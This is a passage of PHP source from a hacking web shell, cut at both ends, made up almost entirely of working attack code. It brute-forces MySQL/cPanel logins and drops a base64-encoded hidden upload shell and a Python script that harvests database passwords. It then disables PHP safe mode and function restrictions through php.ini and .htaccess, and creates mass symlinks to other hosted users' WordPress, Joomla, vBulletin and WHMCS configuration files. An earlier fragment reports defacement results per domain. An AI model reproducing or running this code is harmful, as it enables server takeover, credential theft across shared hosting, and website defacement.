echo "<p align='center' dir='ltr'><font color='green' face='audiowide' size='2'>Done =><font color='red'> $domain </font></font></p>";
    ob_flush();
    flush();
    continue;
}
if(eregi('Domain has been defaced during last year:', $data )){
echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>Failed =><font color='red'> $domain </font> => Domain has been defaced during last year</font></p>";
    ob_flush();
    flush(); 
    continue;
    }
if(eregi('Error', $data )){
   echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>Error =><font color='red'> $domain</font></p>";
   continue;
}

}





}; ?>

        <?php
        unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
        echo '';
        }
        elseif(isset($_GET['x']) && ($_GET['x'] == 'brute'))
        {
        ?>
        <form action="?y=<?php echo $pwd; ?>&amp;x=brute" method="post">
            <?php
            //bruteforce
            ?>
            <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
            <?php
            /*
Recoded By X'1n73ct
*/
            @set_time_limit(0);
            @error_reporting(0);


            if($_POST['page']=='find')
            {
                if(isset($_POST['usernames']) && isset($_POST['passwords']))
                {
                    if($_POST['type'] == 'passwd'){
                        $e = explode("\n",$_POST['usernames']);
                        foreach($e as $value){
                            $k = explode(":",$value);
                            $username .= $k['0']." ";
                        }
                    }elseif($_POST['type'] == 'simple'){
                        $username = str_replace("\n",' ',$_POST['usernames']);
                    }
                    $a1 = explode(" ",$username);
                    $a2 = explode("\n",$_POST['passwords']);
                    $id2 = count($a2);
                    $ok = 0;
                    foreach($a1 as $user )
                    {
                        if($user !== '')
                        {
                            $user=trim($user);
                            for($i=0;$i<=$id2;$i++)
                            {
                                $pass = trim($a2[$i]);
                                if(@mysql_connect('localhost',$user,$pass))
                                {
                                    echo "X'1n73ct~ user is (<b><font color=green>$user</font></b>) Password is (<b><font color=green>$pass</font></b>)<br />";
                                    $ok++;
                                }
                            }
                        }
                    }
                    echo "<hr><b>You Found <font color=green>$ok</font> Cpanel by x'1n73ct</b>";
                    echo "<center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
                    exit;
                }
            }
            if($_POST['pass']=='password'){
                @error_reporting(0);
                $i = getenv('REMOTE_ADDR');
                $d = date('D, M jS, Y H:i',time());
                $h = $_SERVER['HTTP_HOST'];
                $dir=$_SERVER['PHP_SELF'];
                $back = "PD9waHANCmVjaG8gJzxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG5hbWU9InVwbG9hZGVyIiBpZD0idXBsb2FkZXIiPic7DQplY2hvICc8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgc2l6ZT0iNTAiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsNCmlmKCAkX1BPU1RbJ191cGwnXSA9PSAiVXBsb2FkIiApIHsNCmlmKEBjb3B5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snZmlsZSddWyduYW1lJ10pKSB7IGVjaG8gJzxiPktvcmFuZyBEYWggQmVyamF5YSBVcGxvYWQgU2hlbGwgS29yYW5nISEhPGI+PGJyPjxicj4nOyB9DQplbHNlIHsgZWNobyAnPGI+S29yYW5nIEdhZ2FsIFVwbG9hZCBTaGVsbCBLb3JhbmchISE8L2I+PGJyPjxicj4nOyB9DQp9DQo/Pg==";
                $file = fopen(".php","w+");
                $write = fwrite ($file ,base64_decode($back));
                fclose($file);
                chmod(".php",0755);
                mkdir('config',0755);
                $cp =
                    'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCicnJw0KQnk6IEFobWVkIFNoYXdreSBha2EgbG54ZzMzaw0KdGh4OiBPYnp5LCBSZWxpaywgbW9oYWIgYW5kICNhcmFicHduIA0KJycnDQoNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHJlDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHVybGxpYg0KaW1wb3J0IGdsb2INCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KDQppZiBsZW4oc3lzLmFyZ3YpICE9IDM6DQogIHByaW50JycnCQ0KIFVzYWdlOiAlcyBbVVJMLi4uXSBbZGlyZWN0b3J5Li4uXQ0KIEV4KSAlcyBodHRwOi8vd3d3LnRlc3QuY29tL3Rlc3QvIFtkaXIgLi4uXScnJyAlIChzeXMuYXJndlswXSwgc3lzLmFyZ3ZbMF0pDQogIHN5cy5leGl0KDEpDQoNCnNpdGUgPSBzeXMuYXJndlsxXQ0KZm91dCA9IHN5cy5hcmd2WzJdDQoNCnRyeToNCiAgcmVxICA9IHVybGxpYi51cmxvcGVuKHNpdGUpDQogIHJlYWQgPSByZXEucmVhZCgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAndycpDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZiA9IG9wZW4oJ2RhdGEudHh0JywgJ3cnKSAgDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KDQogIGkgPSAwDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBmID0gb3BlbignZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgY2xlYW51cCA9IHN1YnByb2Nlc3MuUG9wZW4oJ3JtIC1yZiAvdG1wL2RhdGEudHh0ID4gL2Rldi9udWxsJywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBjbGVhbnVwID0gc3VicHJvY2Vzcy5Qb3BlbignZGVsIEM6XGRhdGEudHh0Jywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIHByaW50ICdcbicsICctJyAqIDEwMCwgJ1xuJw0KICBpZiBzeXN0ZW0oKSA9PSAnTGludXgnOg0KICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGZvdXQpOg0KICAgICAgZm9yIGZuYW1lIGluIGZpbGVzOg0KICAgICAgICBmdWxscGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmbmFtZSkNCiAgICAgICAgZiA9IG9wZW4oZnVsbHBhdGgsICdyJykNCiAgICAgICAgZm9yIGxpbmUgaW4gZjoNCiAgICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3IgaXMgbm90IE5vbmU6IHByaW50IChzZWNyLmdyb3VwKDIpKSAgDQogICAgICAgICAgc2VjcjEgPSByZS5zZWFyY2gociIocGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3IyID0gcmUuc2VhcmNoKHIiKERCX1BBU1NXT1JEJykoLi4uKSguK1tePl0pKCcpIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyMiBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3IyLmdyb3VwKDMpKQ0KICAgICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjMgaXMgbm90IE5vbmU6IHByaW50IChzZWNyMy5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNCA9IHJlLnNlYXJjaCAociIoREJQQVNTV09SRCA9ICcpKC4rW14+XSkoLjspIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3I1ID0gcmUuc2VhcmNoIChyIihEQnBhc3MgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjUgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNS5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjYgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNi5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNyA9IHJlLnNlYXJjaCAociIobW9zQ29uZmlnX3Bhc3N3b3JkID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZm9yIGluZmlsZSBpbiBnbG9iLmdsb2IoIG9zLnBhdGguam9pbihmb3V0LCAnKi50eHQnKSApOg0KICAgICAgZiA9IG9wZW4oaW5maWxlLCAncicpDQogICAgICBmb3IgbGluZSBpbiBmOg0KICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyIGlzIG5vdCBOb25lOiBwcmludCAoc2Vjci5ncm91cCgyKSkgIA0KICAgICAgICBzZWNyMSA9IHJlLnNlYXJjaChyIihwYXNzd29yZCA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkNCiAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICBzZWNyMiA9IHJlLnNlYXJjaChyIihEQl9QQVNTV09SRCcpKC4uLikoLitbXj5dKSgnKSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IyIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjIuZ3JvdXAoMykpDQogICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IzIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjMuZ3JvdXAoMikpDQogICAgICAgIHNlY3I0ID0gcmUuc2VhcmNoIChyIihEQlBBU1NXT1JEID0gJykoLitbXj5dKSguOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNSA9IHJlLnNlYXJjaCAociIoREJwYXNzID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNSBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I1Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I2IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjYuZ3JvdXAoMikpDQogICAgICAgIHNlY3I3ID0gcmUuc2VhcmNoIChyIihtb3NDb25maWdfcGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICBmLmNsb3NlKCkNCmV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQpOg0KICBwcmludCAnXG5UaGFua3MgZm9yIHVzaW5nIGl0IC5fXic=';
                $file = fopen("cp.py","w+");
                $write = fwrite ($file ,base64_decode($cp));
                fclose($file);
                chmod("cp.py",0755);
                $url = $_POST['url'];
                echo"<center>
<textarea cols=\"90\" rows=\"20\" name=\"usernames\">";
                system("python cp.py $url config");
                unlink ('cp.py');
                echo"</textarea>
</center>";
                echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
                exit;
            }
            if($_POST['matikan']=='sekatan'){
                @error_reporting(0);
                $phpini =
                    'c2FmZV9tb2RlPU9GRg0KZGlzYWJsZV9mdW5jdGlvbnM9Tk9ORQ==';
                $file = fopen("php.ini","w+");
                $write = fwrite ($file ,base64_decode($phpini));
                fclose($file);
                $htaccess =
                    'T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ==';
                $file = fopen(".htaccess","w+");
                $write = fwrite ($file ,base64_decode($htaccess));
                echo "<hr><center><b>DONE!";
                echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
                exit;
            }
            if($_POST['mendapatkan']=='passwd'){
                @set_magic_quotes_runtime(0);
                ob_start();
                error_reporting(0);
                @set_time_limit(0);
                @ini_set('max_execution_time',0);
                @ini_set('output_buffering',0);
                $fn = $_POST['foldername'];
//all function here

                function syml($usern,$pdomain)
                {
                    symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
                    symlink('/home/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
                    symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
                    symlink('/home/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
                    symlink('/home/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
                    symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
                    symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
                    symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
                    symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
                    symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
                    symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
                    symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
                    symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
                    symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
                    symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
                    symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
                    symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
                    symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
                    symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
                    symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
                    symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
                    symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
                    symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
                    symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
                    symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
                    symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
                    symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
                    symlink('/home/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
                    symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
                    symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
                    symlink('/home2/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
                    symlink('/home2/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
                    symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
                    symlink('/home2/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
                    symlink('/home2/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
                    symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
                    symlink('/home2/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
                    symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
                    symlink('/home2/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
                    symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
                    symlink('/home2/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
                    symlink('/home2/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
                    symlink('/home2/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
                    symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
                    symlink('/home2/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
                    symlink('/home2/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
                    symlink('/home2/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
                    symlink('/home2/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
                    symlink('/home2/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
                    symlink('/home2/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
                    symlink('/home2/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
                    symlink('/home2/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
                    symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
                    symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
                    symlink('/home2/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
                    symlink('/home2/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
                    symlink('/home2/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
                    symlink('/home2/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
                    symlink('/home2/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
                    symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
                    symlink('/home3/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
                    symlink('/home3/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
                    symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
                    symlink('/home3/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
                    symlink('/home3/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
                    symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
                    symlink('/home3/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
                    symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
                    symlink('/home3/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
                    symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
                    symlink('/home3/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
                    symlink('/home3/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
                    symlink('/home3/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
                    symlink('/home3/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
                    symlink('/home3/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
                    symlink('/home3/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
                    symlink('/home3/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
                    symlink('/home3/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
                    symlink('/home3/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
                    symlink('/home3/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
                    symlink('/home3/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
                    symlink('/home3/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
                    symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
                    symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
                    symlink('/home3/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
                    symlink('/home3/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
                    symlink('/home3/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
                    symlink('/home3/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
                    symlink('/home3/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
                    symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
                    symlink('/home4/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
                    symlink('/home4/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
                    symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
                    symlink('/home4/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
                    symlink('/home4/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
                    symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
                    symlink('/home4/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
                    symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
                    symlink('/home4/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
                    symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
                    symlink('/home4/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
                    symlink('/home4/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
                    symlink('/home4/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
                    symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
                    symlink('/home4/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
                    symlink('/home4/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
                    symlink('/home4/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
                    symlink('/home4/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
